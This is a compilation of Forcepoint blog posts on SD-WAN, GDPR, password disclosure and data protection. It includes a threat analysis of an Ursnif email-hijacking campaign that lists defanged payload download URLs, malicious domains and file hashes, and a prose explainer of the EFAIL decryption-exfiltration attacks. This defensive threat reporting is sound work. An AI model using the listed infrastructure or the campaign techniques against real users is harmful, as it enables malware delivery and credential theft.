You can read Part I in the series here and Part II here.]\n\n\n\n	Myth #4: SD-WAN solutions are already enterprise-grade\n\n\n\n	SD-WAN has exploded in popularity, but that doesn’t mean that all SD-WAN vendors do the same thing. Some only provide a specific type of connectivity or can only handle a few locations. Early SD-WAN solutions didn’t pay much attention to security beyond making sure that traffic was encrypted over the links closest to each location.\n\n\n\n	A new generation of enterprise-grade SD-WAN solutions is emerging, shifting the focus of SD‑WAN from baseline connectivity to capabilities that both connect and protect on a global scale.\n\n\n\n	Operating at Global Scale \n\n\n\n	True enterprise SD-WAN solutions are now capable of handling more than 1000 sites, each with different connectivity technologies and ISPs at each location. “Always-on” high availability is now the norm in such deployments, with heterogeneous clustering of networks and devices that prevents packets from being dropped, even during updates and upgrades.\n\n\n\n	State-of-the-Art Security\n\n\n\n	Full next generation firewall (NGFW) and intrusion prevention system (IPS) capabilities are mandatory anywhere a site touches the internet. Modern enterprise SD-WAN solutions integrate security into networking to prevent gaps and eliminate the burden of managing multiple systems.\n\n\n\n	Policy-based, Centralized Management\n\n\n\n	Simple remote configuration schemes, such as connecting to an administrative web interface running on a single device, are good for making minor changes in small environments, but quickly become unwieldy when dealing with hundreds or thousands of locations. The repetitive, labor-intensive actions they require are both time-consuming and error-prone, creating gaps and inconsistencies across locations.\n\n\n\n	Enterprises need truly centralized administration that allows business practices to be described once in higher-level policy terms and then automatically applied everywhere they are needed. Such systems make sophisticated security more reliable and avoid the need to send technicians onsite and provide visibility into every location (physical, as well as virtual and cloud-based) on the network.\n\n\n\n	Given how dynamic today’s networks are, policy updates must be fast to make and to deploy to support new sites and applications to mitigate potential threats. Making important changes across your entire network should take minutes—not hours—without taking sites offline. Look for secure enterprise SD-WAN solutions that do both networking and security efficiency at scale.\n\n\n\n	Myth #5: SD-WAN has built-in security\n\n\n\n	According to Gartner, branches need the same level of enterprise-grade security that organizations use in their primary internet gateways. Many first-generation SD-WAN solutions enforce encryption of traffic over commodity broadband links using Virtual Private Network (VPN) technologies, which keeps data and communications between different sites private but doesn’t make the sites themselves any more secure.\n\n\n\n	New, enterprise-grade SD-WAN solutions have security that is fully distributed at each location; they don’t rely on the single, centralized gateway like hub-and-spoke networks do. This keeps attackers from sneaking into your stores, branches, or remote offices and can help protect and accelerate the use of SaaS applications. Leading-edge enterprise SD-WAN providers are also using techniques such as “service chaining” to apply advanced security capabilities (e.g., web traffic protection and CASB) to secure data transmitted to cloud-based apps.\n\n\n\n	\n\n\n	Secure enterprise SD-WAN is already in use around the world.\n\n\n\n	These practices aren’t just theory, they’re real. Forcepoint’s secure enterprise SD-WAN is used by organizations around the world to connect and protect highly distributed stores, branches, and remote offices. Its policy-centric approach integrates networking and security to eliminate gaps. It can automate the management of thousands of devices from a single console and push updates to every location in minutes with just a few clicks. Our interactive VPN setup replaces laborious spreadsheets with immediate drag-and-drop to add new sites to even the most complex topologies. With Forcepoint, it’s easy and safe to augment or replace expensive MPLS lines with whatever commodity broadband links are available in each location.\n\n\n\n	Watch our recently recorded webcast, “Enterprise SD-WAN in the Real World,” to learn how our MSSP partner uses Forcepoint’s secure enterprise SD-WAN capabilities to optimize connectivity and security for 400 sites around the world, or check out the eBook \"5 Myths About Enterprise SD-WAN.\"', 'https://www.forcepoint.com/blog/insights/sd-wan-mythbusting-part-iii\n');

You can read Part I in the series here.]\n\nMyth #2: SD-WAN takes the place of the internet\n\nSD-WAN is hot and it’s generating a lot of hype. Some of the noise is valid, such as how SD-WAN can help distributed organizations use interactive cloud apps in a more productive and cost-effective way. Yet occasionally this gets misconstrued, creating confusion and distracting from SD-WAN’s real value.\n\nThere are some people who think SD-WAN takes the place of the internet, or that it can replace previous ways of getting sites online. They have the impression that SD-WAN is a specific type of network connection or a whole separate network. This myth probably stems from people dealing with service providers offering proprietary network connections that act as a front-end private network for getting to the internet. While such link-specific solutions are often faster and less expensive than point-to-point MPLS lines, they often are only available in limited geographies or are time-consuming to provision.\n\nSD-WAN doesn’t replace the internet—it improves access to it.\n\nSD-WAN is about choices, enabling you to connect each location directly to the internet in the most effective way possible. It doesn’t mandate any single type of link; in fact, it works best when mixing different types of technologies (e.g., cable, DSL, fiber, 4G/LTE, even MPLS lines that are still under contract) and different ISPs. SD-WAN provides a better way to tailor connectivity to each site’s needs and local market conditions but should never attempt to limit or take the place of any websites or internet applications. In other words, SD-WAN doesn’t replace the internet but does facilitate connectivity.\n\n\n\nMyth #3: SD-WAN eliminates the need for on-premises hardware\n\nSD-WAN is frequently used to direct traffic for particular applications across specific links. This is especially important when using highly interactive cloud apps like Office 365 that work best over low latency, high-bandwidth connections. It also can enforce use of techniques such as encryption to provide privacy and data transmission security for accessing cloud apps that aren’t already relying on SSL/TLS.\n\n\n\nBut even with SD-WAN, your internet links and local networks are still plugged into on-premises equipment. Fortunately, real SD-WAN solutions automate and centralize the management of such devices, allowing you to deploy new locations without an on-site technician.\n\nEnterprise SD-WAN consolidates networking and security into a single box.\n\nYou need strong security wherever you connect to the internet. Gartner now advises organizations to put the same level of security in each branch office that they have at their primary internet gateway. Most “SD-WAN 1.0” services either ignore this or tack on rudimentary firewalls. Modern enterprise SD-WAN solutions integrate full next generation firewall and IPS capabilities to eliminate gaps and provide combined networking and security management for each site.\n\nWatch our recently recorded webcast, “Enterprise SD-WAN in the Real World,” to learn how our MSSP partner uses Forcepoint’s secure enterprise SD-WAN capabilities to optimize connectivity and security for 400 sites around the world, or check out the eBook \"5 Myths About Enterprise SD-WAN.\"\n\nNext week in our final installment, we’ll look at Myth 4 “SD-WAN solutions are already enterprise-grade” and Myth 5 “SD-WAN has built-in security.”\n\n \n\nSD-WAN Mythbusting: Part I\n\nSD-WAN Mythbusting: Part III', 'https://www.forcepoint.com/blog/insights/sd-wan-mythbusting-part-ii\n');

Since late 2017 one set of attackers appear to have taken something of a hybrid approach, hijacking legitimate email conversations in a manner similar to the more targeted technique of Business Email Compromise (BEC).\n\nIn the case of BEC, companies with frequent wire transfers and external suppliers are often the main focus. There is usually a preliminary step of harvesting login credentials, typically by deploying keyloggers or through phishing attacks. Once the credentials have been collected and business emails can be accessed remotely, cybercriminals will start monitoring the internal communication of the target environment. When a financial transfer is about to happen between the company and one of its suppliers the email thread is ‘hijacked’ and a new, fake invoice is delivered from what looks like an internal or trusted sender.\n\nCritically, the body of the email delivering the new invoice reflects the previous conversation between the two parties, aiming to fool the recipient to use the newly delivered invoice instead of the previous one.\n\nIn the case of the observed Ursnif campaign, the email threads being hijacked are not necessarily finance related but do typically involve communications between companies and their customers or suppliers. The full ‘tail’ of the thread is included in the reply, along with an apparently accurate signature of the sender being spoofed.\n\nThe body of the email is somewhat less exceptional, typically referring to the attached weaponised document with a short note such as ‘please review the attached’ – often a warning sign, especially in unexpected emails.\n\nIn one case we have recorded, the email thread being used was over seven years old, suggesting a creative but ultimately flawed (and presumably semi- or fully-automated) approach to selecting threads to hijack.\n\nPayload\n\nInstead of a digital invoice (as one would expect with BEC), the attachment is a Microsoft Word OLE document posing as a request or inquiry. In some, but not all cases, the filename of this attachment also features the name of the spoofed sender’s organisation.\n\nThe document contains one or more highly obfuscated macros and shows an embedded image trying to convince the user to enable macros if they are otherwise disabled. In the current campaign, these images have been translated and localised as appropriate for the recipient.\n\n\n\nFor those less cautious recipients with macro execution enabled by default, an immediate download of another file from a dedicated download server will occur.\n\nThe recent iterations took two forms, either directly downloading a malicious executable or alternatively downloading a short, obfuscated JavaScript/PowerShell script before reaching the final payload. These ‘.class’ or ‘.yarn’ payloads, despite their file extension, are portable executables (PE) containing Ursnif.\n\nThe download requests typically follow formats similar to those shown below.\n\nDirect download\n\n\nRequest 1 - hxxp://qwqw1e4qwe14we[.]com/KOM/testv.php?l=boun4.yarn\n\n​Intermediate JS/PS\n\n\nRequest 1 - hxxp://qwundqwjnd[.]net/cachedmajsoea/index.php?e=kuuud\nRequest 2 - hxxp://qwundqwjnd[.]net/lipomargara/kuuud.yarn\n\n​Download servers\n\nDuring our investigation we observed multiple distribution domains being registered and shut down on a daily basis.\n\nThese servers appear to track their own infection statistics, maintained by code within testv.php as part of the download process. These statistics are available from a stats.php page which displays the logged data from a JSON file (lex_192h.json) stored on the server.\n\n\n\nInterestingly, the actors behind these distribution servers do not appear to be particularly concerned with OPSEC: the JSON files often contain statistics for filenames which were part of previous campaigns and no longer exist.\n\nA similar oversight was the occasional presence of files called ‘crypt_xxxx_yyyy[a-z].exe’ in open directories. These files point to some of the specifics of the botnet featured in the campaign, with ‘yyyy’ representing the botnet ID stored in Ursnif\'s internal configuration data for a given sample.\n\n\n\nThe old-new Ursnif code\n\nThe way the statistics are implemented suggests that the actors behind the campaign either preferred to avoid modifying Ursnif\'s core or that there are different groups with different skill levels involved in these operations. Statistics could be sent to the main Ursnif C2, but that would require proper understanding of its communication code and the parallel communications method suggests that the actors running these operations might not be the same ones maintaining the source code.\n\nHaving said that, there have still been some changes to the Ursnif code as part of this campaign: the downloaded ‘.class’ or ‘.yarn’ files differ from other ‘loader + DLL’ solutions seen in the past, indicating that the packaging was modified for this campaign.\n\nAll of the samples examined had the same internal timestamp of Apr 17 2018 and had been packed. As a result of the packing process, the observed file sizes vary from approximately 700KB to 2MB. When run, the executable unpacks the original payload into memory, overwriting the packer code itself and passing over execution to the next layer. At this stage there is an additional piece of code responsible for creating two new threads, both involving the use of Mailslots.\n\nMailslots\n\nMailslots are an Inter Process Communication (IPC) protocol and have been part of Windows distributions for more than a decade. Their purpose in the context of Ursnif is quite straightforward: one thread reads embedded data from memory, unpacks it and writes the result to ‘\\\\.\\mailslot\\msl0’, while the other thread pulls that data from the Mailslot.\n\n\n\nThe use of Mailslots is apparently intended, in combination with other previously documented ‘tricks’ such as mouse movement tracking, simply to hamper analysis of the malware.\n\nThe data pulled from the Mailslot is ultimately a DLL (crm.dll) to which execution is passed. The main function of crm.dll is to unpack and load its final stage, the client.dll. This is the last step in the execution chain and comprises the main body of Ursnif code and its configuration data such as C2 server addresses, botnet IDs, timeouts etc.\n\nProtection statement\n\nForcepoint customers are protected against this threat at the following stages of attack:\n\nStage 2 (Lure) – Malicious emails associated with this attack are identified and blocked.Stage 5 (Dropper File) – Malicious files are prevented from being downloaded.Stage 6 (Call Home) – Attempts to contact C2 servers are blocked.\n\nConclusion\n\nComparing these samples to previously documented Ursnif variants there are some notable differences in the way they work: e.g. there were no signs of TLS callback usage, yet the introduction of the Mailslot mechanism was an apparently new addition to the old codebase.\n\nConsidering that as of mid-May 2018 there appears to be a new ‘TLS callback’ variant in the wild, it seems plausible that multiple cybercriminal groups of differing skill levels are trying to improve on the original code. A minority of them potentially have the skills to improve the main code, whereas others appear to ‘make do’ with writing custom distribution code, leaving the core of the malware untouched.\n\nAs a result it appears that there are now multiple forks of Ursnif/Gozi in the wild. However, their main purpose is still the same: stealing credentials and banking related information.\n\nAs always when working with email attachments, it’s important to pay attention to what file one is about to open: any document which suggests modifying the security settings within Word should be avoided. Overall, it’s always advisable to be vigilant, paying extra attention to who the sender in the case of unexpected or unusual emails.\n\nIndicators of Compromise\n\nSHA1\n\n\n018f88acc9591f0ca3fcfec9297297173c5b0232\n0b0dab27ca660ba528a29de5bdf5a9af603a6e1a\n185dba0cfdbf512fbf64ab41c0771f2784032a8a\n1ffb6a64b703a2c40859b76a2335c724e5763806\n220c38a509a2f0e62b279ad4f140e0aed79f2816\n2540a48d0587ce4a9b6859282ec2993dc5fea95b\n3787934bf18909a2f17eaf916a4ef38d94035ebf\n3f772913f9fe8a1c448efba4412ac17ba66f5e94\n3fb7059f1e10fef0052427b6324c2eab67140381\n40f1ac132672b3b2006b2852e7b2bbaf5cff43ac\n45fb72f34b8b018d9dc5730e22e9850951395c59\n482ce27840693991d5bf7b8ee2d298aeb4f8db66\n4b431fade4c87ac138923c59cba920e1219ab419\n4f8a4b73e7537ec1d9ad5124c3d09235b6573a94\n619af677b3754888296c1def52517eeeeb31058a\n74ab56a3997606933795f6377c2f86df99d51810\n79dde9c7e0cceee8e5d9626819e2c33f9cce0425\n8be96462a9a47bb95e5bc9ab61315e38feda26b9\n8c274f0b095f9533212d0171001d47e71919ddb2\n8fde99d9727e7c431fd19ce68cff44835e33e43b\n962905f9fba3aee435d12268d00dc6ff7cca14f9\n9da4bb1b1c6730231924047266624ba439ad9d91\n9def879bb4c602f9945cec3b554ce34b0708638d\nacc225210a206b81e4b4e8669affbc21407a53fb\nb061889548e9c23b02dcab0910952d686b58026f\nb51f9dd4735d841e4c787be717a383eb2b2d979b\nb7d8a0b1da3dde8dec1f121e9eceefbde02f2631\nc5fe4bc083ae504b37277e5090a1413fe1afddc6\ncf24b05895101663a1d7b0d4f671918c2d8e60ae\nd69c31c87a10c940ca928aaf484b258c64e4c866\nd8f028d06027718ff4d5d18a22d225e9bbd2fe0a\ndfdbe5b5b5fdd28226771c95b0cf8f44f4710031\ne24e85eb34ea9cb3b7ed7057e566d342a3b9b69c\ne9e6821cf4ec1d55bc78de93fc0fe1b8a0f8c59e\nedb7fe4cc6f05f5ae9ff6c3d1c7e8e237c6c679a\nee0620b09b374a49a10859d6877c45d988730498\neef49be4569f68de71c968fc38d7cfe5b5ac0eab\nf64e25db4f2cfec731d40f7a5547b2b8e48cf9e3\nf90e096dfe0a07d55ab9691c6db70faac924580e\n\nURLs\n\n\nhxxp://14ca1s5asc45[.]com\nhxxp://9qwe8q9w7asqw[.]com\nhxxp://asd5qwdqwe4qwe[.]com\nhxxp://d4q9d4qw9d4qw9d[.]com\nhxxp://dq9wq1wdq9wd1[.]com\nhxxp://dqowndqwnd[.]net\nhxxp://eq9we1qw1qw8[.]com\nhxxp://fqw4q8w4d1qw8[.]com\nhxxp://g98d4qwd4asd[.]com\nhxxp://gtqw5dgqw84[.]com\nhxxp://hhhasdnqwesdasd[.]com\nhxxp://hhjfffjsahsdbqwe[.]com\nhxxp://jjasdkeqnqweqwe[.]com\nhxxp://kkjkajsdjasdqwec[.]com\nhxxp://kkmmnnbbjasdhe[.]com\nhxxp://mmmnasdjhqweqwe[.]com\nhxxp://oiwerdnferqrwe[.]com\nhxxp://ooaisdjqiweqwe[.]com\nhxxp://oooiasndqjwenda[.]com\nhxxp://oooiawneqweasd[.]com\nhxxp://oqk4123613123[.]net\nhxxp://oyiyuarogonase[.]net\nhxxp://popopoqweneqw[.]com\nhxxp://ppoadajsqwenqw[.]com\nhxxp://ppoasdqnwesad[.]com\nhxxp://pqwoeasodiqwejes232[.]com\nhxxp://q5q1wdq41dqwd[.]com\nhxxp://qiwjesijdqweqs[.]com\nhxxp://qw6e54qwe54wq[.]com\nhxxp://qw8e78qw7e[.]com\nhxxp://qwd1q6w1dq6wd1[.]com\nhxxp://qwd1qw8d4q1wd[.]com\nhxxp://qwdohqwnduasndwjd212[.]com\nhxxp://qwe1q9we1qwe51[.]com\nhxxp://qwekasdqw8412[.]net\nhxxp://qweoiqwndqw[.]net\nhxxp://qwojdaisd1231[.]net\nhxxp://qwqw1e4qwe14we[.]com\nhxxp://qwqweqw4e1qwe[.]com\nhxxp://qwundqwjnd[.]net\nhxxp://r9qweq19w1dq[.]com\nhxxp://rqw1qwr8qwr[.]com\nhxxp://rrrradkqwdojnqwd[.]com\nhxxp://sdf5wer4wer[.]com\nhxxp://sdjqiweqwnesd[.]com\nhxxp://t8q79q8wdqw1d[.]com\nhxxp://tr8q4qwe41ewe[.]com\nhxxp://tttiweqwneasdqwe[.]com\nhxxp://uuasdjqwehnasd[.]com\nhxxp://uurty87e8rt7rt[.]com\nhxxp://uuyyhsdhasdbee[.]com\nhxxp://wdojqnwdwd[.]net\nhxxp://wdq9d5q18wd[.]com\nhxxp://yyjqnwejqnweqweq[.]com', 'https://www.forcepoint.com/blog/security-labs/many-faces-ursnif-email-hijacking-mailslots-and-insecure-servers\n');

The latter is a method of securing data in transit: when the email arrives on the recipient’s machine it is no longer encrypted. PGP and S/MIME, on the other hand, secure the data at rest (and, as a by-product, provide an additional layer of security in transit). This is particularly desirable for anyone who is concerned about the security of their communications should, for example, their laptop be stolen – S/MIME is often used in enterprises for this very reason.\n\nThe EFAIL vulnerabilities\n\nThe full details of EFAIL are naturally provided by the authors, but the two variants both look at ‘tricking’ an email client into revealing the decrypted text of a message. \n\nSeparate CVE numbers have been assigned for the gadget attacks against OpenPGP (CVE-2017-17688) and S/MIME (CVE-2017-17689).\n\nDirect exfiltration\n\nThe first vulnerability involves wrapping the encrypted text in a malformed HTML image tag. After the email client has decrypted the email, the blob of decrypted content sits inside the source URL section of the tag, resulting in the client making a request to a domain containing the entire decrypted text – assuming the attacker controls the server receiving the request, they now have the full message (or at least the important bit) in plain text.\n\nWhile this variant affects the popular Apple Mail and Mozilla Thunderbird clients, the good news is that it is theoretically fixable by patching the email clients.\n\nCBC/CFB gadget attack \n\nThe second variant is rather more technical and effectively relies on the combination of the known format of S/MIME emails in particular with block cipher techniques although again, at the end of the day, the goal again is to insert a malformed tag to trick the client into making an HTTP request containing the plain text of the message.\n\nThis variant is reportedly more effective against S/MIME than PGP encryption, but unfortunately should work against any standard-compliant email client. \n\nProtection & mitigation\n\nIt is worth noting that in both cases someone needs to intercept your email to carry out the attack. This significantly reduces the likelihood of EFAIL becoming widespread, although for ‘high value’ targets such as politicians, journalists, etc. the risk is still serious.\nNaturally, we recommend applying any vendor patches which may be released to counter these vulnerabilities as soon as they become available. In the meantime, there are steps that can be taken to attempt to minimise risk:\n\nDisable HTML Email – Frequently recommended by the security industry, disabling the rendering of HTML email will prevent your email client from parsing image links (among other things). While this doesn’t guarantee safety, it removes many potential avenues of attack within email content. Note that this is specifically disabling the viewing of HTML email which you have received, as opposed to simply changing the default format in which you write and send messages.\n\nDisable automatic decryption in your email client – Note that this does not mean stopping the use of PGP or S/MIME. It simply means that your email client no longer handles the decryption for you. The EFF provide details on how to take this step in Thunderbird, Apple Mail, and iOS Mail. \n\nAs ever, Forcepoint Security Labs will continue to monitor for new developments and attacks in the wild.', 'https://www.forcepoint.com/blog/security-labs/efail-openpgp-smime-vulnerabilities\n');

As a Twitter user, I promptly changed my password and in the process discovered that over the years I had linked my Twitter account to dozens of applications, many of which I don’t even use anymore (hello TweetDeck). That prompted me to clean up my Twitter act. And then I sat down with Forcepoint’s chief scientist, Richard Ford, to make sense of what happened and what lessons we can glean on user identity and data protection.\n\n\n\n	Liem Nguyen: What’s your take on the Twitter issue – is this a serious problem or much ado about nothing?\n\n\n\n	Richard Ford: I think Twitter very much did the right thing here: they had no hard evidence that these passwords had been spilled outside their walls, but decided to go public to be sure. That’s a good step, and for that, they get a gold star, so well done Twitter!\n\n\n\n	Second, Twitter has provided support for two-factor authentication for quite some time, so if you have an account you really care about, using some form of 2FA would mean that even if your password was leaked, no real harm was done. So again, I’d consider all of that positive. There’s a lot of good to celebrate here, as odd as that sounds.\n\n\n\n	Broadening the aperture a bit, let’s talk about this in the sense of the overall ecosystem. As a security practitioner with over a quarter of a century (gosh, when I write it like that it sounds like forever!) experience, I’m still surprised that high-value accounts can be protected with just a simple password in 2018! We can and should do better, and I’d like to hope this is a bit of a nudge to do that.\n\n\n\n	LN: Did Twitter have to disclose this?\n\n\n\n	RF: While I cannot speak to the legal aspect, I will leave that to the attorneys, I will say “have to” is quite nuanced. Legally, there are breach notification laws that Twitter would likely be subject to – for example, California led the way here with requiring that applies to “to any resident of California whose unencrypted personal information was, or is reasonably believed to have been, acquired by an unauthorized person.” The shades of grey here are around whether the presence of the passwords in an internal log file for some period of time is covered.\n\n\n\n	In addition, Twitter is a global company, operating in multiple jurisdictions, so it’s possible that the answer would be “yes” in some places, and “maybe” or “no” in others. For example, when GDPR comes into effect, it comes with obligations around disclosure. Again, though, there could be discussion about whether this was “unlikely to result in a risk to the rights and freedoms” of the impacted users. It will be interesting to see how this is interpreted.\n\n\n\n	LN: Why do you think Twitter disclosed the potential breach? After all, there’s no evidence that these authentic credentials were misused.\n\n\n\n	RF: I can’t speak for Twitter, but I can offer a few reasons that I would have done it in their position. First, I might have concluded that this did pass the bar for legally requiring notification. In that case, you have a simple choice: break the law or do the right thing. Of course, you adhere to the legal obligations you have. Another possibility is simply what we might assume by reading this at face value: it’s out of an abundance of caution. Institutional trust is critical in the online ecosystem, so maybe the calculus was about minimizing downside risk in the event that someone had looked at those passwords and that information someday got out to the media, either directly or indirectly. \n\n\n\n	However, I prefer to think of this as a company just deciding to do the right thing and accept the publicity hit. There’s a risk to users, however small, and they decided that letting people know was simply the more socially responsible thing to do. I don’t believe social responsibility is dead – so in the absence of any other data, I’m going to go with that. Bluntly, I also think it’s smart; as I said before, in the event that it all came to light later after actual accounts had been breached, it would have been awful -- and avoidable. \n\n\n\n	LN: What’s the next step?\n\n\n\n	RF: I do think the bigger picture here is the shock (and some level of frustration) I have that we still rely on passwords as much as we do. To me, there are lots of more effective ways to at least bolster the protection provided. Most users continue to know the dangers but still reuse passwords or use passwords that are weak. There are alternatives, and I hope we adopt them more broadly over the coming year.\n\n\n\n	For starters, embrace 2FA (2 Factor Authentication), don’t reuse passwords, and you will be safer online, period. Even well-intentioned systems like Twitter can – as we’ve seen – inadvertently leak information to insiders. While defense in depth helps here (solutions that look at data exfiltration and file access, for example, would help determine that nothing was taken, at least in bulk), users have to be savvy and take a bit of control over their own destiny in order to minimize their own personal exposure.\n\n\n\n	In addition, having to remember lots of passwords results in security friction – and that’s bad for everyone (I just got back from the RSA Conference where I gave a talk on Cyber Fatigue. Friction is a major driver for bad practices). Even once a user is authenticated, there’s the concept of “continuous authentication” where a risk-adaptive system looks at behaviors to try and be sure they are not the result of a compromised account. It’s important to remember that authentication shouldn’t be viewed as a “single point in time” attestation, but also as a process (and a critical one at that).\n\n\n\n	As for me, I’ll be getting online as soon as I get done here and resetting my password… and just so we’re clear on this, “Password123!” would be a bad choice. Just saying.', 'https://www.forcepoint.com/blog/insights/twitter-said-change-your-passwords-and-they%E2%80%99re-only-half-right\n');

What know you of ready?”\n      — Yoda to Luke Skywalker [The Empire Strikes Back]\n\nThe good news is that organisations have been making preparations in readiness of GDPR for many years. Some may have been working towards the May deadline for months but are making good progress in increasing the transparency of why they collect and how they process personal data, are understanding the data they do hold, how to secure it and how to respond to a breach.Others may not be so ready if a breach were to happen whether tomorrow or post-May 25th. The key to GDPR is that the May 25th date should not be seen as a deadline.  Organisations will need to continually adjust and improve their security going forwards as an increasing number of privacy and data security regulations come to bear.\n\nWithin the business community I feel a profound sense of urgency building around GDPR.  While at conferences this year I see many entities both small and large struggling to rush out enhancements to the visibility of data and the security of that. Many are now realising that the reach of GDPR is broader than the EU countries out of which the regulations originate.  If you hold data on European residents you must adhere to GDPR wherever your headquarters or datacentres might be located.\n\nWhile there remains uncertainty around the consequences of being in breach of the GDPR requirements the potential impact of fines as much as 4 percent of global revenue has spurred action across legal teams, IT teams and newly appointed Data Protection Officers. As organisations notify their supervisory authority of breaches post-25 May their peers will be looking closely at the penalties issued and the reasons why.\n\nWe know that grey areas exist within the GDPR text.  It is no secret that the phrase “adequate” occurs multiple times but what constitutes an “adequate level of data protection” has yet been put to the test.  For those who haven’t yet made progress towards GDPR I urge you to carefully consider the implications on your business if found to be at odds with the ethos of GDPR.  Many businesses are now showcasing their GDPR-readiness to their customers in public ways such as via communication requesting those customers re-subscribe to items such as newsletters and check the personal data that is being held and processed.  Now is a good time as any to do this if you have not already.\n\nGDPR has become a board-level discussion due impart to the potentially damaging consequence of fines incurred if found in breach of the regulations, the need to demonstrate a respect for privacy and client’s personal data and the desire to move to a higher plain of privacy and data protection.\n\nTo be ready for GDPR demands an appraisal and enhancement of people, process and technology.  As much as we would like there is no one technology or one supply chain tweak that will provide what you are looking for.  Only a holistic approach taking into account user education, an understanding of your supply chain, your data flows, your malware prevention capabilities and your data loss prevention capabilities (to name but a few) will put you in the right state of GDPR-readiness.\n\nOnce the mind-set to protect people’s personal data and be transparent about its use has been adopted across an organisation it becomes much easier to aspire to ever greater pinnacles of security.  GDPR, a significant milestone in consolidating the differing regulations across multiple countries, is likely to herald a new era of privacy regulations that will continually shape and improve how we all do business.\n\nDo or Do Not - there is no Try\n\nPossibly one of Yoda’s most famous quotes across the Star Wars movies we can apply this directly to GDPR.  It has become necessary for organisations to commit themselves fully to protecting the privacy of their clients and securing their critical data and intellectual property.  Drivers such as GDPR do not come around that often so I hope that organisations around the world take the initiative.\n\nIf you need further information on how Forcepoint can help you please see our GDPR Resource Pack.\n\nMay the Fourth Be With You.', 'https://www.forcepoint.com/blog/insights/may-fourth-and-25th-be-you\n');

Some come from across the country while others sit just a few offices away in the same building. While I have of course implemented many Forcepoint solutions, there is nothing compelling me to do so. I have the freedom to choose the technologies that work best for my environment and protect the company.\n\n\n\n	My CISO and I often have conversations around the types of technology we want to bring in, and one of the most important things we look for are products and solutions that help me do more with less, and that offer superior effectiveness and efficacy. As with many other organizations of our size, scaling internal security analysts to match the rate of growing threats, while not compromising the speed of resolution, is a challenge. Any security solution that can help to separate the signal from the noise – either by reducing the number of alerts or helping the analysts to focus on investigations – that’s what I want to prioritize.\n\n\n\n	When the product team at Forcepoint started sharing this concept of Dynamic Data Protection and how it could start to transform security postures, it piqued my interest, and we stayed close to the solution. As the team got closer to bringing this capability to market, I jumped at the opportunity to be Customer Zero. The prospect of using analytics to establish intent and help inform enforcement was something that hit on all my priorities. I was delighted to be able to share our story recently at the RSA Conference in San Francisco in a talk entitled Extending Behavioral Insights into Risk-Adaptive Protection and Enforcement, and I’ve captured some details from that talk in my thoughts below.\n\n\n\n	When we looked at the internal programs we were running, we saw a synergy between Dynamic Data Protection and our existing privacy initiatives. To successfully roll out this type of program, we had to look beyond just the technology – In fact, we had to look beyond IT. Our first step was to establish our privacy policy with the help of our colleagues in Human Resources and Legal. The partnership between CIO, CISO, General Counsel and CHRO is paramount and became the foundation for this program. Once we had organizational buy-in, we made sure to openly communicate the changes to our employee population – who seemed very receptive. Trust is key for the success of a human-centric security program, and transparency goes a long way.\n\n\n\n	The next step was to identify the risk policies we wanted to move from being static to dynamic, and risk-adaptive. We have chosen to migrate many of our policies to the new framework, but don’t necessarily want to make them all variable related to the risk level of the individual. There are many policies related to compliance regulations (such as GDPR), and sensitive data that we want to ensure will be blocked from data exfiltration.  For those policies, we will select an action plan that “blocks all” regardless of risk score. We believe these account for about half of the existing policies. For the remainder, we believe additional context can help inform the enforcement, and we can add more granularity around the action plans. Our criteria includes conditions where we believe having more information about the behavior of the user would help inform decision making. For example, for our removable media policy, we can leverage risk-adaptive action plans based on the user risk score, with enforcement options ranging from Audit, to Audit/Encrypt to Encrypt/Notify to Block.\n\n\n\n	At this point we will have established our program and started to create policies we want to enforce. The next step is to establish the baseline – to ensure that the system best understands the users’ “normal” behavior, so it can appropriately identify the anomalies. To do this, we are running the system in audit mode, allowing the analytics engine to learn for 30 days to ensure we minimize false positives and that appropriate calibration is performed. Then we will increase the notification for when any of these new risk policies get invoked. We want to do a deeper inspection to verify the triggers were behaving the way we intended. We know we will need to end up tweaking a few of the thresholds to get the results we are expecting. In some cases, this will involve increasing or decreasing the strictness of enforcement.\n\n\n\n	Often, the role of the security team dealing with alerts is to find the needle in the haystack. What we learned is that there are two ways to achieve this goal. The first is to build a better needle-finding algorithm while the second is to just get rid of the hay. After implementing Dynamic Data Protection, we can do both. The aggregate number of alerts that hit my analysts have gone down, because of the flexibility afforded with the automated policy enforcement. My user community is now more productive because I’ve relaxed some of the more rigid DLP policies, that were impacting the ease of doing business.  We’re still pretty early on in our deployment, but early indicators show that we’re scratching the surface of unlocking the potential of this capability.\n\n\n\n	Our plan is to stay in lock-step with our HR and legal teams and roll out Dynamic Data Protection on a country-by-country basis following the privacy restrictions imposed by each of the countries in which we do business. Our goal with this program is to remove the security friction without losing security control, to stop the bad and free the good. I look forward to sharing more of our internal roll-out of the program with you as we hit future milestones.', 'https://www.forcepoint.com/blog/insights/dynamic-data-protection-customer%E2%80%99s-perspective\n');

The products within this framework are integrated to provide visibility and protection unsurpassed in the industry whether you are looking to protect your data, gain visibility into SaaS usage, or stop malware from entering your enterprise.\n\n\n\n	Traditional enterprise security programs have limited means for understanding their users and therefore tend to group users by role or department (i.e., tools such as Active Directory). They then apply a least privilege policy to the group, balancing access needs against organizational risk. Under this rubric, all users are therefore considered risky and subjected to the same restrictions. While these restrictions may impede bad behavior, they also restrict perfectly legitimate behavior leading to frustrated workers, costly delays, clumsy workarounds, and in extreme cases workers going around corporate policies to do their job. As an answer to this legacy operational model, converged solutions such as Dynamic Data Protection offer an easy path to achieving greater efficiency without sacrificing security. Dynamic Data Protection can even adapt your security policies to your individual users and adjust based on their behavior, ensuring an optimal level of security is always applied.\n\n\n\n	This is the same principle used by TSA as part of their TSA PreCheck program.

This led to the TSA PreCheck program which created a new class of traveler subjected to a simpler screening process in exchange for providing detailed background information.

Effective and seamless security solutions have never been more important given the aforementioned and the overall uptick in data breaches.\n\n\n\n	For decades, government cybersecurity has focused on locking down endpoints and perimeters, building walls and moats to protect networks and data. This task was relatively simple when all your systems were under your direct control. However, with increased reliance on operating models that embrace inter-agency connectivity, cloud and mobility, agencies no longer have direct visibility into all critical systems.\n\n\n\n	At the same time, data is accessible from anywhere, expanding the attack surface at an exponential rate and making it more difficult to identify and prevent threats. Amidst the disruption, the two constants that cybersecurity professionals can direct their focus on are people and data, and everywhere those two constants interact.\n\n\n\n	The traditional, event-centric approach is one that seeks to solve the problem with additional layers of technology. Instead, the security paradigm needs to shift from billions of events to a more manageable number—the thousands of people “on the inside” who access sensitive data (e.g., employees, contractors, constituents, hackers) whose actions, unintentional or not, may pose a security risk.\n\n\n\n	The user is the new perimeter\n\n\n\n	Forcepoint’s human-centric security approach provides visibility into human interaction with data and the context to understand the intent behind that interaction. People are creatures of habit; using the interaction context allows security to dynamically adapt and apply countermeasures as appropriate.\n\n\n\n	This Risk 